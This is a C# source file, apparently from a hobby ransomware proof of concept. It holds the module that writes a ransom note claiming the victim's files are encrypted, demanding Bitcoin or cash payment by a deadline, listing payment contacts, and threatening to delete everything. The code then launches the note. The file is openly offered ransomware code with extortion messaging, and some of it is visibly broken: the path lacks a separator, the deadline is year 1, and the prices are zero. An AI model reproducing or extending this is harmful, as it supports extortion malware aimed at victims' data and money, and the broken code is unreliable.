using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

namespace Ilay_sRanomwarePoc
{
    static class TargetNote
    {

        private static readonly string NoteDirectory = Directory.GetCurrentDirectory() + "RansomwareReadMeRightNow.txt";
        //some information about the payment:

        private const string BitcoinAccount = "ilayliSmuelov@EtherBit";  //btw these arent real  
        private const string BankingInfo = "ilay@chase";
        private const string Email = "ilaysamuelov@C&c.com";
        private const string PhoneNumber = "0123456789";

        private const double PriceInShekels = 0;
        private const int BitCoins = 0;


        //time information
        private static readonly DateTime TimeOfInfection;
        private static readonly DateTime TimeIsUp = new DateTime(1, 1, 1);  //the date to set the coundown to



        private static readonly string NoteAboutTheRansomware = $"Dear User, your files and important data are encrypted. " +
            $"in ordet to be able of seeing your data evet again, youll hvae to pay me {PriceInShekels} or{BitCoins} Bitcoins" +
            $"Infection time: {TimeOfInfection}. you have {(TimeIsUp - TimeOfInfection).ToString()} left to pay!"
            + $"The banking information is listed below: \n BitcoinAccount: {BitcoinAccount} \n BankingInfo:" +
            $" {BankingInfo} \n Email: {Email}  \n PhoneNumber: {PhoneNumber}" + "\n note that the ransomware has admin privlages and any" +
            " suspicious behavior will \n cause it to delete EVERYTHING! so dont try us!";

        static TargetNote()
        {
            TimeOfInfection = DateTime.Now;
        }
        public static void GenerateNote()
        {
            FileStream Writer = File.Create(NoteDirectory);
            Writer.Write(AesEncryption.ConvertStringToByte(NoteAboutTheRansomware));
            Writer.Close();
            CommandLineExecution.CommandExecution(NoteDirectory);

        }


    }
}
